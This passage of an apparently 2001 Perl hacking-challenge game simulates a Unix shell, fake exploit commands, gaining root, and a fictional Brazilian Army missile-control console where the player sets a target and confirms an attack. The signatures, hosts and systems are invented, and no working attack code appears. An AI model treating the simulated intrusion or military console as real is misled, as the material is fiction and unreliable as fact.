   # /var/lib/apache/Makefile.tmpl
   print STDERR << "EOT"
## ====================================================================
## Copyright (c) 1998-1999 The Apache Group.  All rights reserved.
##
## Redistribution and use in source and binary forms, with or without
## modification, are permitted provided that the following conditions
## are met:
##
## 1. Redistributions of source code must retain the above copyright
##    notice, this list of conditions and the following disclaimer.
##
## 2. Redistributions in binary form must reproduce the above copyright
##    notice, this list of conditions and the following disclaimer in
##    the documentation and/or other materials provided with the
##    distribution.
##
## 3. All advertising materials mentioning features or use of this
##    software must display the following acknowledgment:
##    "This product includes software developed by the Apache Group
##    for use in the Apache HTTP server project (http://www.apache.org/)."
##
## 4. The names "Apache Server" and "Apache Group" must not be used to
##    endorse or promote products derived from this software without
##    prior written permission. For written permission, please contact
##    apache\@apache.org.
##
## 5. Products derived from this software may not be called "Apache"
##    nor may "Apache" appear in their names without prior written
##    permission of the Apache Group.
##
## 6. Redistributions of any form whatsoever must retain the following
EOT
}

sub cat_271
{
   # /var/lib/apache/README
   print STDERR << "EOT"

                                 Apache
                             Version 1.3 (and up)

  What is it?
  -----------

  Apache is an HTTP server designed as a plug-in replacement for
  the NCSA server version 1.3 (or 1.4). It fixes numerous bugs in
  the NCSA server and includes many frequently requested new
  features, and has an API which allows it to be extended to meet
  users' needs more easily.

  The Latest Version
  ------------------

  Details of the latest version can be found on the Apache HTTP
  server project page under http://www.apache.org/.

  Documentation
  -------------

  The documentation available as of the date of this release is
  also included, in HTML format, in the htdocs/manual/ directory.
  For the most up-to-date documentation can be found on
  http://www.apache.org/docs/.

  Installation
  ------------
EOT
}

sub cat_272
{
   # /var/lib/apache/README.NT
   print STDERR << "EOT"

                                 Apache
                             Version 1.3 (and up)

  What is it?
  -----------

  Apache is an HTTP server, originally designed for Unix systems. This
  is the version of Apache for Microsoft Windows NT, 98, and 95
  systems.  Like the Unix version, it includes many frequently
  requested new features, and has an API that allows it to be extended
  to meet users' needs more easily. It also allows ISAPI extensions.


  The Latest Version
  ------------------

  Details of the latest version can be found on the Apache HTTP
  server project page under http://www.apache.org/.

  Documentation
  -------------

  The documentation available as of the date of this release is
  also included, in HTML format, in the htdocs/manual/ directory.
  For the most up-to-date documentation can be found on
  http://www.apache.org/docs/. For Windows specific information, see
  http://www.apache.org/docs/windows.html.

  WARNING
EOT
}

sub cat_273
{
   # /var/lib/apache/README.configure
   print STDERR << "EOT"
                              
  APACHE CONFIGURATION

  Apache 1.3 Autoconf-style Interface (APACI)
  ===========================================

  APACI is an Autoconf-style interface for the Unix side of the Apache 1.3
  HTTP server source distribution. It is actually not GNU Autoconf-based, i.e.
  the GNU Autoconf package itself is not used. Instead APACI just provides a
  similar batch configuration interface and a corresponding out-of-the-box
  build and installation procedure.

  The basic goal is to provide the following commonly known and expected
  procedure for out-of-the-box building and installing a package like Apache:

    \$ gunzip <apache_1.3.X.tar.gz | tar xvf -
    \$ ./configure --prefix=PREFIX [...]
    \$ make
    \$ make install
  
  NOTE: PREFIX is not the string "PREFIX". Instead use the Unix
        filesystem path under which Apache should be installed. For
        instance use "/usr/local/apache" for PREFIX above.

  After these steps Apache 1.3 is completely installed under PREFIX and
  already initially configured, so you can immediately fire it up the first
  time via

    \$ PREFIX/sbin/apachectl start
EOT
}

sub cat_274
{
   # /var/lib/apache/WARNING-NT.TXT
   print STDERR << "EOT"
WARNING: The Win32 release of Apache should 
still be considered beta quality code.  
It does not meet the normal standards of 
stability and security that Unix releases do.  
There are numerous known bugs and 
inconsistencies.  There is also a much 
greater chance of security holes being 
present in the Win32 version of Apache.
EOT
}

sub cat_275
{
   # /var/lib/apache/configure
   print STDERR << "EOT"
#!/bin/sh
## ====================================================================
## Copyright (c) 1998-1999 The Apache Group.  All rights reserved.
##
## Redistribution and use in source and binary forms, with or without
## modification, are permitted provided that the following conditions
## are met:
##
## 1. Redistributions of source code must retain the above copyright
##    notice, this list of conditions and the following disclaimer. 
##
## 2. Redistributions in binary form must reproduce the above copyright
##    notice, this list of conditions and the following disclaimer in
##    the documentation and/or other materials provided with the
##    distribution.
##
## 3. All advertising materials mentioning features or use of this
##    software must display the following acknowledgment:
##    "This product includes software developed by the Apache Group
##    for use in the Apache HTTP server project (http://www.apache.org/)."
##
## 4. The names "Apache Server" and "Apache Group" must not be used to
##    endorse or promote products derived from this software without
##    prior written permission. For written permission, please contact
##    apache\@apache.org.
##
## 5. Products derived from this software may not be called "Apache"
##    nor may "Apache" appear in their names without prior written
##    permission of the Apache Group.
##
EOT
}

sub cat_276
{
   # /misc/cnm/signatures
   print STDERR << "EOT"
# CNM Signatures Authentication File
# For use with local and remote authentication.

session "br"
{
   sat "brasilsatII"
   sat_id "0xbfffff"
   receptor "ns.DNS.br"
   station group "estados"
}

station group "estados"
{
   item "Acre" master "ac."
   item "Alagoas" master "al."
   item "Amapa" master "ap."
   item "Amazonas" master "am."
   item "Bahia" master "ba."
   item "Ceara" master "ce."
   item "Distrito Federal" master "df."
   item "Espirito Santo" master "es."
   item "Goias" master "go."
   item "Maranhao" master "ma."
   item "Mato Grosso" master "mr."
   item "Mato Grosso do Sul" master "ms."
   item "Minas Gerais" master "mg."
   item "Para" master "pa."
   item "Paraiba" master "pb."
   item "Parana" master "pr."
   item "Pernambuco" master "pe."
   item "Piaui" master master "pi."
   item "Rio de Janeiro" master "rj."
   item "Rio Grande do Norte" master "rn."
   item "Rio Grande do Sul" master "rs."
   item "Rondonia" master "rd."
   item "Roraima" master "ro."
   item "Santa Catarina" master "sc."
   item "Sao Paulo" master "sp."
   item "Sergipe" master "se."
}

link alias
{
   item "goias" alias "goias.mil.br"
   item "baan" alias "baan.goias.mil.br"
}

signatures
{
   item "goias" description "ada_biron" value
   "mQCNAirDhV8AAAED/i4LrhQ/mwOgam8ZfQpEcxYoE9kru5oRDGtoVeKae/4bUver
   aGX7qVtskD6vwPwr2FF6JW2c+z2oY4JGPGUArORiigoT82/q6vqT0Wm1jIPsXQSB
   ZCkBoyvBcmXEi+J7eDBbWLPDxeDimgrORbAIQ4uikRafs8KlpNyA8qbVMny5AAUR
   tCV3aWV0c2UgdmVuZW1hIDx3aWV0c2VAd3p2Lndpbi50dWUubmw+iQEVAwUQNEfn
   hgyPsuGbHvEpAQExUAgAkAZTAVqzICTlVMggjsG9NghqC0FPqO2s9BQLXH3lQDdQ
   C2tOx1CYvL3pB8X77alh18/HnUd6PNkloHC2fqNo5eNyuVDeUpvW+mz6IRlndnJU
   kLVx/Kzu+h3TooWlX/BSc+k0XsQJ7mpP4QeWvoHll50rBPVLYnv4ODbZh0z5jYfr
   Yq2n/05vi5nRdz2gXqRRIorfD46a5n+gQNAvrwhKMRZeyqEfOCtQ+UjMH7tyGG0N
   +suzNQtBjypEZkB8OFEQB1Q3RatQlWx55JOfmcba0JBY9umOuNoDPldvIgMbExRP
   5tN+qOjsHbm723S1kybyQKEbQgx3pDA3xiz9SBFqjYkBFQMFEDRH59NGYudYIBG4
   eQEB3XMH/RXG4wFjy32JDJPaVmS14Ax53VGOBUDLZo9Uv8lG3uTIe886lLeDqWA2
   fHyyUFwUBC917NR0D9HCTAAQ5PZYO7kOV5JMSLWoxyLYRimHcUnhfBJ9XthVvjvH
   NuItWWXVLND0UjTkmHJSCtTxcM6Yo7NuisIJOYcnRameWK105FPb9i3ATaEejM8C
   NPfgiHp9Krv5EVfAHJ+gBy/q4kKqQYFZgdbogVS5aKQJiO5imGEtxGl7qSxfC1WJ
   TmrauU/8CbBQM6MvifnIep+LI+IBLwDFSByZDPR5dakjeCGMnNtj2XYEu0mWtz/5
   DHOIDGz9whNF1DBUBbHM3BEuUai87eWJAD8DBRA0R+e9YVgWxTrOVf4RAtpXAKDK
   jQQ4a7pxrgLA63H4XHhfCNC9PACghwiSLYqPdnsyMM+LN/I3su2zF7OJAJUDBRA0
   R+f8d6a8PicAdv0BAXNeBACgGcN9znLn0yHysY852uUntwMS9CAlTdSLkiRaf1gM
   sV+VQipFvSzS+rmg/DtiWDJ46Z5ffJe6rMnIn59yGgmkelj6hTDi3eGcarGnIFQJ
   PG61JmfdTxtyQ5lY5zpNoBnKwVHCYBoMvpvoe0axVhQm23+j/qll44jcnORmqcYD
   YIkAPwMFEDRH56iWgad8PVLgfxECrc8An2xiSfGbEsocbX5eOUkTc6jYiRwCAKDC
   FIaSRaNnmB3sHPaj0TnaGri6h4kAlQMFEDRgoatWKpzSj2i9yQEBKQkD/0Znfn9u
   jEPIpUpPLO1HvFX16IMx+JXYQcFakporAmvNzw28a351cWNQOTSr0ZS+8G6YNXEQ
   WUeI2NE96gIpUmb6m2XNJ5ucdLRG2PsSwwcYtuipRXaR3aHrLwPRDEdlo0ifC+Bm"

   item "baan" description "baan_daia" value
   "iQA/AwUBOhJlSW7fLJob6xkXEQJgpACfSP5fzZWft5antg+DdXMdYcAOVSQAoKN/
   lhge4y3XCAroyWUA004N/acM
   =LYU/"

}
EOT
}

############################################################################
############################################################################
############################################################################
############################################################################
#             The system functions starts here ...
############################################################################
############################################################################
############################################################################
############################################################################

print STDERR $clear;
animation();
screen();
#$login = "root";
#$uid = "0";
#$gid = "0";

while ($tries != 3)
{
   #last;   #Enable this to disable login (for development)
   if (login() == 0)
   {
      print STDERR "Login incorrect\n\n";
      $tries = $tries + 1;
      if ($tries == 3)
      {
         print STDERR "\nYou haven't access rights on this server.\n";
         print STDERR "If you have any problem please contact the system administrator\n\n";
         increment("data/nao_logaram.dat");
         exit;
      }
   }
   else
   {
      last;
   }
}
increment("data/logaram.dat");

print STDERR $clear;
print STDERR "Last login: Sun Jan 28 22:42:28 -0200 2001 on ttyp1.\n";

while (1)
{
   if ($hacked)
   {
      print STDERR "bash-2.03# ";
   }
   else
   {
      print STDERR "$lowhostname:$pwd$promptstate ";
   }
   $cmd = get();
   parsecmd($cmd) if ($cmd);
}

sub parsecmd
{
   my $tudo = $_[0];
   my @argv = split(" ", $tudo);
   my $argc = $#argv;
   my $fullpath = "";

   if (substr($argv[0],0,2) eq "./")
   {
      $argv[0] = substr($argv[0],2,length($argv[0]));
      $fullpath = "$pwd/$argv[0]";
   }
   elsif (substr($argv[0],0,1) eq "/")
   {
      $fullpath = $argv[0];
   }
   else
   {
      $fullpath = findinpath($argv[0]);
   }
   return if ($fullpath eq "/bin/bash");
   if ($argv[0] eq "exit")
   {
      bye();
   }
   elsif ($fullpath eq "/usr/bin/who")
   {
      say("root     tty1     Jan 28 22:19");
      say("lorena   ttyp0    Jan 28 22:21 (lorena.$hostname)");
      say("joao     ttyp1    Jan 28 22:23 ($hackerhost)");
   }
   elsif ($fullpath eq "/usr/bin/whoami")
   {
      say("$login");
   }
   elsif ($fullpath eq "/bin/arch")
   {
      say("$proc");
   }
   elsif ($fullpath eq "/bin/mount")
   {
      if ($login ne "root")
      {
         print STDERR "mount: $argv[1]: must be superuser to mount\n";
      }
      else
      {
         print STDERR "mount: can't find $argv[1] in /etc/fstab or /etc/mtab\n";
      }
   }
   elsif ($fullpath eq "/bin/umount")
   {
      if ($login ne "root")
      {
         print STDERR "umount: $argv[1]: must be superuser to umount\n";
      }
      else
      {
         print STDERR "umount: $argv[1]: not found\n";
      }
   }
   elsif ($fullpath eq "/bin/login")
   {
      say("No utmp entry.  You must exec \"login\" from the lowest level \"sh\"");
   }
   elsif ($fullpath eq "/vmdanOS")
   {
     say("bash: $argv[1]: cannot execute binary file");
   }
   elsif ($fullpath eq "/usr/bin/score")
   {    
      my $nao_logaram = readfile("data/nao_logaram.dat");
      my $logaram = readfile("data/logaram.dat");
      my $rootaram = readfile("data/rootaram.dat");
      my $winners = filetostring("data/hall.dat");
      print STDERR "

$laranja
         DanOS RELEASE 1.0.0
Copyright (c) 2001 Danix Software, Inc
         Designed by pcHazard $vermelho_claro

             Hall da Fama $branco_claro

Pessoas que nao conseguiram logar:   $cinza_escuro [$nao_logaram]$branco_claro
Pessoas que logaram no sistema:      $cinza_escuro [$logaram]$branco_claro
Pessoas que pegaram root no sistema: $cinza_escuro [$rootaram]$vermelho_claro

Venceram o desafio do DanOS RELEASE 1.0.0:  $verde_claro

$winners\n $normal

";
   }
   elsif ($fullpath eq "/bin/netstat")
   {
      if ($login ne "root")
      {
         say("kernel: ids: Only superuser can see any network state.");
      }
      else
      {
         print STDERR << "EOT"
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address
Listen:
tcp        0      0 127.0.0.1:53            0.0.0.0:*
tcp        0      0 0.0.0.0:25              0.0.0.0:*
tcp        0      0 0.0.0.0:110             0.0.0.0:*
tcp        0      0 0.0.0.0:23              0.0.0.0:*
udp        0      0 127.0.0.1:53            0.0.0.0:*
raw        0      0 0.0.0.0:1               0.0.0.0:*
raw        0      0 0.0.0.0:6               0.0.0.0:*
Established:
tcp        0      0 $serverip:23 -> $hackerip:1024
tcp        0      0 $hackerip:1024 -> $serverip:23
tcp        0      0 $serverip:23 -> 200.2.4.5:1024
tcp        0      0 200.2.4.5:1024 -> $serverip:23

Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node Path
unix  0      [ ACC ]     STREAM     LISTENING     63     /dev/gpmctl
unix  1      [ ]         STREAM     CONNECTED     182    \@0000000a
unix  0      [ ACC ]     STREAM     LISTENING     36     /dev/log
unix  1      [ ]         STREAM     CONNECTED     61     \@00000002
unix  1      [ ]         STREAM     CONNECTED     39     \@00000001
unix  1      [ ]         STREAM     CONNECTED     125    \@00000006
unix  0      [ ACC ]     STREAM     LISTENING     185    /var/run/ndc
unix  1      [ ]         STREAM     CONNECTED     183    /dev/log
unix  1      [ ]         STREAM     CONNECTED     126    /dev/log
unix  1      [ ]         STREAM     CONNECTED     62     /dev/log
unix  1      [ ]         STREAM     CONNECTED     40     /dev/log
EOT
      }
   }
   elsif ($fullpath eq "/usr/bin/screen")
   {
      say("screen: Cannot determine terminal type");
   }
   elsif ($fullpath eq "/usr/bin/xaos")
   {
      say("xaos: missing configuration file");
   }
   elsif ($fullpath eq "/bin/pwd")
   {
      say("$pwd");
   }
   elsif ($fullpath eq "$exploit_pwd/xaosx")
   {
      xaos_exploit($argv[1]) if ($exploit_location ne "0");
   }
   elsif ($fullpath eq "$exploit_pwd/sux")
   {
      su_exploit($argv[1])  if ($exploit_location ne "0");
   }
   elsif ($fullpath eq "$exploit_pwd/screenx")
   {
      screen_exploit($argv[1]) if ($exploit_location ne "0");
   }
   elsif ($fullpath eq "/bin/uname")
   {
      say("DanOS $lowhostname 1.0.0 #127 Tue Jan 30 13:22:54 BRST 2001 $proc unknown");
   }
   elsif ($fullpath eq "/bin/kill")
   {
      my ($pid,$sig);

      if ($argv[1] eq "")
      {
         print STDERR "bash: kill: Missing argument\n";
         last;
      }
      if (substr($argv[1],0,1) eq "-")
      {
         $sig = $argv[1];
         $pid = $argv[2];
      }
      else
      {
         $pid = $argv[1];
         $sig = $argv[2];
      }
      if ($login eq "joao")
      {
         if ($pid ne "98")
         {
            say("kernel: ids: must be superuser to access other user's processes");
            say("bash: kill: ($pid) - no such process");
         }
         else
         {
            if (($sig eq "-9") || ($sig eq "-11"))
            {
               bye();
            }
         }
      }
   }
   elsif ($fullpath eq "/bin/killall")
   {
      my ($pid,$sig);

      if ($argv[1] eq "")
      {
         print STDERR "bash: killall: Missing argument\n";
         last;
      }
      if (substr($argv[1],0,1) eq "-")
      {
         $sig = $argv[1];
         $pid = $argv[2];
      }
      else
      {
         $pid = $argv[1];
         $sig = $argv[2];
      }
      if ($login eq "joao")
      {
         if (($pid ne "bash") && ($pid ne "killall"))
         {
            say("kernel: ids: must be superuser to access other user's processes");
            say("bash: killall: ($pid) - no such process");
         }
         else
         {
            if ($pid eq "bash")
            {
               if (($sig eq "-9") || ($sig eq "-11"))
               {
                  bye();
               }
            }
         }
      }
   }
   elsif ($fullpath eq "/bin/cat")
   {
      catfile($argv[1]);
   }
   elsif ($fullpath eq "/bin/date")
   {
      print STDERR `date`;
   }
   elsif ($fullpath eq "/bin/df")
   {
      my $ans = "/dev/hda5              1445008   1265608    104812  92% /\n/dev/hda1               921476    676560    244916  73% /mnt/w95\n/dev/fd0                  1423      1389        34  98% /mnt/fw95";
      say("$ans");
   }
   elsif ($fullpath eq "/usr/bin/clear")
   {
      print STDERR $clear;
   }
   elsif ($fullpath eq "/bin/hostname")
   {
      print STDERR "$hostname\n";
   }
   elsif ($fullpath eq "/bin/echo")
   {
      my $cnt;
      for $cnt (1 .. $argc)
      {
         print STDERR "$argv[$cnt] ";
      }
      print STDERR "\n";
   }
   elsif ($fullpath eq "/bin/ps")
   {
      if ($login eq "joao")
      {
         if ($argv[1] eq "aux")
         {
            say("USER       PID %CPU %MEM   VSZ  RSS TTY      STAT START   TIME COMMAND");
            say("joao        98  5.7  4.4  2020 1296 ttyp1    S    12:27   0:01 -bash");
            say("joao       383  1.2  1.4  2320 1296 ttyp1    S    12:29   0:01 ps aux");
         }
         else
         {
            say("  PID TTY          TIME CMD");
            say("   98 ttyp1    00:00:00 bash");
            say("  383 ttyp1    00:00:00 ps");
         }
      }
      elsif ($login eq "root")
      {
         if ($argv[1] eq "aux")
         {
            say("USER       PID %CPU %MEM   VSZ  RSS TTY      STAT START   TIME COMMAND");
            say("root        96  5.7  4.4  2020 1296 ttyp1    S    12:27   0:01 -bash");
            say("lorena      97  5.7  4.4  2020 1296 ttyp1    S    12:27   0:01 -bash");
            say("joao        98  5.7  4.4  2020 1296 ttyp1    S    12:27   0:01 -bash");
            say("root       103  5.7  4.4  2020 1296 ttyp1    S    12:27   0:01 -bash");
            say("root       403  1.2  1.4  2320 1296 ttyp1    S    12:29   0:01 ps aux");
         }
         else
         {
            say("  PID TTY          TIME CMD");
            say("  103 ttyp1    00:00:00 bash");
            say("  403 ttyp1    00:00:00 ps");
         }
      }
      else
      {
         say("ps: You dont exists.  Go away!\n");
      }
   }
   elsif ($argv[0] eq "cd")
   {
      changedir($argv[1]);
   }
   elsif ($fullpath eq "/bin/su")
   {
      $argv[1] = "root" if ($argv[1] eq "");
      simulate_su($argv[1]);
   }
   elsif ($fullpath eq "/misc/cnm/control")
   {
      if ($login eq "root")
      {
         simulate_control();
      }
      else
      {
         print STDERR "bash: control: Permission denied\n";
      }
   }
   elsif ($fullpath eq "/usr/bin/nslookup")
   {
      simulate_nslookup($argv[1]);
   }
   elsif ($fullpath eq "/sbin/lsmod")
   {
      if ($login eq "joao")
      {
         print STDERR "lsmod: must be superuser to manage modules\n";
      }
      elsif ($login eq "root")
      {
         my $ids_entry = "";
         $ids_entry = "\nids                    64543   0" if ($ids_running eq "1");
         print STDERR << "EOT"
Module                  Size  Used by$ids_entry
iBCS                  135456   0
pcmcia_core            39080   0
bsd_comp                3568   0  (unused)
ppp                    20428   0  [bsd_comp]
slhc                    4300   0  [ppp]
parport_pc              5588   0  (unused)
parport                 6724   0  [parport_pc]
EOT
      }
      else
      {
         print STDERR "lsmod: you dont exists. Go away!\n";
      }

   }
   elsif ($fullpath eq "/sbin/insmod")
   {
      if ($login eq "joao")
      {
         print STDERR "insmod: must be superuser to manage modules\n";
      }
      elsif (($login) eq "root")
      {
         if ($argv[1] ne "ids")
         {
            say("insmod: $argv[1]: Module not found\n");
         }
         else
         {
            activeids("unauthorized ids managing");
         }
      }
      else
      {
         print STDERR "lsmod: you dont exists. Go away!\n";
      }
   }
   elsif ($fullpath eq "/sbin/rmmod")
   {
      if ($login eq "joao")
      {
         print STDERR "insmod: must be superuser to manage modules\n";
      }
      elsif (($login) eq "root")
      {
         if ($argv[1] eq "ids")
         {
            if ($ids_running eq "1")
            {
               $ids_running = "0";
               alarm 0;
            }
            else
            {
               say("rmmod: ids: module not found");
            }
         }
         else
         {
            say("rmmod: $argv[1]: Cannot remove module");
         }
      }
      else
      {
         print STDERR "lsmod: you dont exists. Go away!\n";
      }
   }
   elsif ($fullpath eq "/usr/bin/wget")
   {      
      simulate_wget($argv[1]);
   }
   elsif ($fullpath eq "/bin/ls")
   {
      listfiles($argv[1]);
   }
   elsif ($fullpath eq "/usr/bin/id")
   {
      if ($login eq "joao")
      {
         print STDERR "uid=$uid gid=$gid(users) groups=$gid(users)\n";
      }
      elsif ($login eq "root")
      {
         print STDERR "uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),100(users)\n";
      }
      else
      {
         print STDERR "id: $login: You don't exist. Get out !\n";
      }
   }
   else
   {
      print STDERR "bash: $argv[0]: command not found\n";
   }
}

sub simulate_nslookup
{
   my $dest = $_[0];

   if ($dest eq "")
   {
      print STDERR "Usage: nslookup <host/ip>\n";
      return;
   }
   elsif ($dest eq "localhost")
   {
      print STDERR "127.0.0.1\n";
   }
   elsif ($dest eq "127.0.0.1")
   {
      print STDERR "localhost\n";
   }
   elsif ($dest eq "$hostname")
   {
      print STDERR "$serverip\n";
   }
   elsif ($dest eq "$serverip")
   {
      print STDERR "$hostname\n";
   }
   elsif ($dest eq "$hackerhost")
   {
      print STDERR "$hackerip\n";
   }
   elsif ($dest eq "$hackerip")
   {
      print STDERR "$hackerhost\n";
   }
   elsif ($dest eq "lorena.$hostname")
   {
      print STDERR "200.2.4.5\n";
   }
   elsif ($dest eq "200.2.4.5")
   {
      print STDERR "lorena.$hostname\n";
   }
   else
   {
      print STDERR "nslookup: $dest: Cannot resolve hostname/ip\n";
   }
}

sub filetostring
{
   my $file = $_[0];
   my $conteudo = "";

   open(ARQ, $file);
   while (<ARQ>)
   {
      $part = $_;
      $conteudo = $conteudo . $part;
   }
   close(ARQ);
   return $conteudo;
}

sub printflag
{
   my $a = "\033[1;33m";
   my $az = "\033[1;34m";
   my $b  = "\033[1;37m";
   my $v = "\033[0;32m";
   my $opt;

   print STDERR << "EOT"
$clear
                      $v _______________________________
                      $v|              $a/ $a\\              $v|
                      $v|           $a/       $a\\           $v|
                      $v|        $a/   $az _____    $a\\        $v|
                      $v|     $a/      $az/     \\      $a\\     $v|
                      $v|  $a<        $az|$b-- _   $az|        $a>  $v|
                      $v|     $a\\     $az|     $b--$az|     $a/     $v|
                      $v|        $a\\   $az\\_____/   $a/        $v|
                      $v|           $a\\       /           $v|
                      $v|              $a\\ /              $v|
                      $v|_______________________________|


             $verde_claro * * * E X E R C I T O    B R A S I L E I R O * * *

                     $amarelo CNM - Controle Nacional de Misseis


                                   $b AVISO

Este e' um sistema fechado de acesso restrito das Forcas Armadas Brasileiras,
    e qualquer tentativa e/ou acesso ilegal a esse sistema acarretara' na
                  quebra de leis e da seguranca nacional $normal

EOT

}

sub simulate_control
{
   printflag();
   sleep 15;
   do
   {
      print STDERR "$clear";
      print STDERR "$branco_claro CNM Stations:$normal\n\n";
      print STDERR "$branco_claro 01$normal Acre                    $branco_claro 14$normal Para\n";
      print STDERR "$branco_claro 02$normal Alagoas                 $branco_claro 15$normal Paraiba\n";
      print STDERR "$branco_claro 03$normal Amapa                   $branco_claro 16$normal Parana\n";
      print STDERR "$branco_claro 04$normal Amazonas                $branco_claro 17$normal Pernanbuco\n";
      print STDERR "$branco_claro 05$normal Bahia                   $branco_claro 18$normal Piaui\n";
      print STDERR "$branco_claro 06$normal Ceara                   $branco_claro 19$normal Rio de Janeiro\n";
      print STDERR "$branco_claro 07$normal Distrito Federal        $branco_claro 20$normal Rio Grande do Norte\n";
      print STDERR "$branco_claro 08$normal Espirito Santo          $branco_claro 21$normal Rio Grande do Sul\n";
      print STDERR "$branco_claro 09$normal Goias                   $branco_claro 22$normal Rondonia\n";
      print STDERR "$branco_claro 10$normal Maranhao                $branco_claro 23$normal Roraima\n";
      print STDERR "$branco_claro 11$normal Mato Grosso             $branco_claro 24$normal Santa Catarina\n";
      print STDERR "$branco_claro 12$normal Mato Grosso do Sul      $branco_claro 25$normal Sao Paulo\n";
      print STDERR "$branco_claro 13$normal Minas Gerais            $branco_claro 26$normal Sergipe\n\n";
      print STDERR "Estacao: ";
      $opt = get();
      redo if ($opt eq "");
      print STDERR "Connecting to station $branco_claro$opt$normal...\n";
      sleep 3;
      if ($opt != 9)
      {
         print STDERR "No route to station.";
         sleep 3;
      }
   } while ($opt != 9);
   print STDERR "CNM: Found station$branco_claro goias.mil.br$normal in$branco_claro brasilsatII.$normal\n";
   sleep 3;
   print STDERR "CNM: Signature \"ada_biron\" sent to server.\n";
   sleep 3;
   print STDERR "CNM: Signature accepted. Authenticated in goias.mil.br\n";
   sleep 3;
   print STDERR "CNM: Found link$branco_claro baan.goias.mil.br$normal. Following link.\n";
   sleep 2;
   print STDERR "CNM: Contacting baan.goias.mil.br ...\n";
   sleep 1;
   print STDERR "LINK: Connected at 38400\n";
   print STDERR "LINK: Welcome to baan.goias.mil.br (Base Aerea de Anapolis)\n";
   print STDERR "LINK: Please authenticate.\n";
   sleep 3;
   print STDERR "CNM: Sent signature \"baan_daia\" to server.\n";
   print STDERR "LINK: Authentication OK. Beggining interactive connection.\n";
   print STDERR "CNM: Entering in interactive mode.\n";
   sleep 3;
   simulate_baa();
   print STDERR "CNM: Link to baan.goias.mil.br lost.\n";
   print STDERR "CNM: Link to goias.mil.br lost.\n";
   print STDERR "CNM: Link to brasilsatII lost.\n";
   sleep 2;
   win();
}

sub simulate_baa
{
   print STDERR "\nBase Aerea de Anapolis\n";

   while (1)
   {
      print STDERR "$branco_claro";
      print STDERR "baan>$normal ";
      my $cmd = get();
      $cmd = uc($cmd);
      next if ($cmd eq "");
      if ($cmd eq "HELP")
      {
         print STDERR "Commands:\n";
         print STDERR "$branco_claro HELP     $normal This help screen\n";
         print STDERR "$branco_claro EXIT     $normal Exit from system\n";
         print STDERR "$branco_claro TARGET   $normal Set the target address\n";
         print STDERR "$branco_claro TYPE     $normal Set the attack strategy\n";
         print STDERR "$branco_claro CONFIRM  $normal Start the attack to target\n";
      }
      elsif ($cmd eq "EXIT")
      {
         print STDERR "Exiting...\n";
         return;
      }
      elsif ($cmd eq "TARGET")
      {
         print STDERR "Enter target address like a normal post-office address:\n";
         $addr = get();
         print STDERR "Target set to: [$addr]\n";
      }
      elsif ($cmd eq "TYPE")
      {
         do
         {
            print STDERR "\n$branco_claro Attack Types:$normal\n\n";
            print STDERR "$branco_claro 01$normal Air$normal\n";
            print STDERR "$branco_claro 02$normal Terrain$normal\n";
            print STDERR "$branco_claro 03$normal Steatlh$normal\n";
            print STDERR "$branco_claro 04$normal Underground$normal\n";
            print STDERR "$branco_claro 05$normal Effective$normal\n\n";
            print STDERR "Attack Type: ";
            $attack_type = get();
         } while ($attack_type > 5);
         print STDERR "Attack Type set to: [$attack_type]\n"
      }
      elsif ($cmd eq "CONFIRM")
      {
         if ($attack_type eq "")
         {
            print STDERR "Attack type not set.\n";
            next;
         }
         if ($addr eq "")
         {
            print STDERR "Attack target not set.\n";
            next;
         }
         print STDERR "This will start the attack from BAAN to target.\nDo you want to continue? [yes/no] ";
         my $conf = get();
         $conf = uc($conf);
         if (substr($conf,0,3) eq "YES")
         {
            print STDERR "Attack now in progress. That God mercy you soul.\n";
            return;
         }
         else
         {
            print STDERR "Attack canceled.\n";
         }
      }
      else
      {
         print STDERR "Command not understood. Type HELP to supported commands.\n";
      }
   }
}

sub findinpath
{
   my $file0 = $_[0];
   my $fp = "";
   my $fullpath = "";

   S: foreach $fp (@paths)
   {
      $fullpath = "$fp/$file0";
      if (indexoffile($fullpath) ne "x")
      {
         return $fullpath;
         last S;
      }
   }
}

sub bye
{
   say("logout");
   sleep 2;
   say("\n\nI hope that you enjoyed this...$branco_claro\n2001 by pcHazard <cybercrash\@ig.com.br>$normal\n\n");
   exit;
}

sub screen
{
   print STDERR $clear;
   print STDERR $vermelho_claro."Welcome to ".$azul_marinho."DanOS ".$vermelho_claro."RELEASE 1.0.0\n";
   print STDERR $azul_claro."Copyright (c) 2001 Danix Software, Inc.\n";
   print STDERR "Connected from $azul_claro2$hackerip$azul_claro in$azul_claro2 ttyp1$azul_claro of $hostname ($proc)\n\n".$normal;
}

sub login
{
   my $authed = "x";

   print STDERR "$lowhostname login: ";
   $login = get();
   sleep 1;
   print STDERR "Password: ";
   $pass = get();
   sleep 3;
   $authed = auth($login,$pass);
   if ($authed ne "x")
   {
      $uid = $authed;
      $gid = $authed;
      if ($authed eq "0")
      {
         become_root();
         $home = "/root";
         $pwd = "/root";
      }
      return 1;
   }
   else
   {
      return 0;
   }
}

sub say
{
   my $txt = $_[0];
   print STDERR "$txt\n";
}

sub animation
{
   print STDERR "$lowhackerhost:/home/httpd# ";
   slowrite("ls -la");
   print STDERR << "EOT";

drwx--x--x   2 root     root         4096 Jan 29 14:30 .
drwxr-xr-x  43 root     root         4096 Jan 29 14:30 ..
-rw-r-----   1 root     root          319 Jul 31  2000 captured_mail.txt
-rw-r--r--   1 root     root         3114 Jan 29 14:30$vermelho_claro exploits.tgz$normal
EOT
   print STDERR "$lowhackerhost:/home/httpd# ";
   slowrite("cat captured_mail.txt");
   print STDERR "
Mail from: joao\@$hostname
Rcpt to: maria\@genetic.com.br
Subject: Convite
Status: RO

Maria, quero convidar voce e seu namorado para uma festa que vai
ter la em casa, sabado as 18:00, pra comemorar a volta ao Brasil
da Cintia, irma da minha namorada, a Alessandra, lembra? 
Nao falte !

Abracos,
Joao
.
";
   print STDERR "$lowhackerhost:/home/httpd# ";
   sleep 5;
   slowrite("telnet $hostname");
   print STDERR "\nTrying $hostname...\n";
   sleep 3;
   print STDERR "Connected to $hostname.\n";
   print STDERR "Escape character is '^]'\n";
   sleep 1;
}

sub slowrite
{
   my $txt = $_[0];
   my $tempo = $_[1];
   my $cnt;
   my $letra;
   
   $tempo = "0.25" if ($tempo eq "");
   for $cnt (0 .. length($txt))
   {
      $letra = substr($txt,$cnt,1);
      #sleep 1;
      select(undef,undef,undef,$tempo);
      print STDERR "$letra";
   }
}

sub changedir
{
   my $dir = $_[0];
   my $longpath = "";
